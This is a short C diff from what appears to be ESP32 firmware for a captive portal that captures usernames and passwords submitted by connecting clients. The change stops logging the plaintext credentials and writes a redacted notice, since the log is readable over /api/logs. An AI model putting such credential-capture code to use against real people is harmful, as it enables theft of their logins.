@@ -399,7 +399,10 @@ static int capture(const char *client_ip, char *body)
     s_recent_total++;
     s_captures++;
     taskEXIT_CRITICAL(&s_mux);
-    ESP_LOGW(TAG, "captured from %s: user='%s' pass='%s' confirmed=%d", client_ip, user, pass, (int)confirmed);
+    // Do NOT log the captured username/password: this line lands in the RAM console ring that
+    // /api/logs serves, so plaintext creds would be readable there. The portal's own (auth-gated) UI
+    // is the only place the captured values surface. Log a redacted breadcrumb for diagnostics only.
+    ESP_LOGW(TAG, "captured credentials from %s (confirmed=%d) [redacted]", client_ip, (int)confirmed);
     return attempt;
 }
 
